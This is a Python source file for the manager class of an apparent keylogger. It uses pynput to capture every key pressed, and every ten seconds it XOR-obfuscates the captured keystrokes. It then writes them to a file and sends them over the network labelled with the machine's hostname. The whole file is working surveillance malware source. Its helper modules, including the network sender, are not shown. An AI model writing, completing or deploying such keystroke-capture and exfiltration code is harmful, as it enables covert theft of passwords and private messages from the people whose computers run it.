from KeyLoggerService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter
from pynput import keyboard
import time
import socket

class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.encryptor = Encryptor()
        self.networkWriter = NetworkWriter()
        self.listener = keyboard.Listener(on_press=self.service.get_keyword)

    def start(self):
        self.service.start_logging()
        self.listener.start()
        print("Keylogger is starting!")

        try:
            while self.service.running:
                time.sleep(10)
                data = self.service.get_logged_keys()
                if data:
                    encrypted_data = self.encryptor.xor(data)
                    self.writer.send_data(encrypted_data, socket.gethostname())
                    self.networkWriter.send_data(encrypted_data, socket.gethostname())

        except KeyboardInterrupt:
            print("\nStopping Keylogger...")
            self.service.stop_logging()

        self.listener.stop()
        print("Keylogger has stopped.")

